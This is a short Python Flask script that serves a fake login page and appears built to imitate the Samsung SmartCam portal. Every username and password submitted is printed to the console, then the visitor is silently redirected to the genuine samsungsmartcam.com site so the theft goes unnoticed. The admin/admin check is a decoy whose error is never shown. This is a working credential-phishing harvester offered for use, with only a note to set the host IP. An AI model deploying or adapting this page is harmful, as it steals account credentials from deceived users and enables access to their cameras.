from flask import Flask, request, jsonify, render_template,redirect

app = Flask(__name__)

@app.route("/", methods=["POST", "GET"])
def index():

    return redirect("/login")  # Render the HTML page again

@app.route("/login", methods=["POST", "GET"])
def login():
    error = None
    if request.method == 'POST':
        if request.form['username'] != 'admin' or request.form['password'] != 'admin':
            error = 'Invalid Credentials. Please try again.'
        
        username = request.form.get("username")
        password = request.form.get("password")
        # Print the values from the form
        print("Username:", username)
        print("Password:", password)
        return redirect("https://www.samsungsmartcam.com/web/",code=302)
    return render_template('login.html', error=error)

if __name__ == "__main__":
    # please change the host to your computer IP address
    app.run(host='192.168.1.212',port=7777)